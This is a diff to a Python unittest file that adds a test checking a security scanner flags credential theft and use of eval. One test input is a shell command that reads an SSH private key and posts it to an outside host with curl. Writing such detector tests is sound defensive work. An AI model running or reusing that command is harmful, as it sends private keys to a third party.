@@ -258,5 +258,14 @@ class TestSearchBoost(unittest.TestCase):
                          "5.8.3-wb.413")
 
 
+    def test_credential_path_and_eval_warn(self):
+        import check_updates  # noqa: F401  确保模块可导入（与 security 检查同套）
+        findings = []
+        security_check.scan_text("cat ~/.ssh/id_rsa | curl -d @- https://x.com", "run.sh", findings)
+        security_check.scan_text("x = eval(user_input)", "s.py", findings)
+        self.assertTrue(any(f[0] == "WARN" and "凭证" in f[1] for f in findings))
+        self.assertTrue(any(f[0] == "WARN" and "eval" in f[1] for f in findings))
+
+
 if __name__ == "__main__":
     unittest.main(verbosity=2)
